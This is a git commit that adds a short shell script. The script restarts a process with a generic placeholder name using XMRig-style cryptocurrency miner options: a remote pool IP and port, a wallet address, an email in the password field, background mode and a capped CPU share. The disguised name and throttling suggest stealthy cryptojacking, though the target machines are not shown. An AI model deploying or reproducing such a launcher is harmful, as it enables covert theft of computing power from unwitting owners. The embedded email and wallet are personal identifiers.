601a7cfadcf5d48a599b6c7684eeacc7637ff96e
menon28 <64425220+menon28@users.noreply.github.com>
2020-05-07 18:34:29 +0200

    Add files via upload

---
+++ 1.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o 198.204.240.82:43151 -u 42rr9G2fpxZGk727wJHthv63rnYZxzbTRRsLVGNiz3BXDrev1dNKL7ohpfNMQvrLqcegpM3t48fSdAqeAbU656QH6gmqhDs --pass=x:mestorman1545@gmail.com --rig-id=06 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=74 --av=1
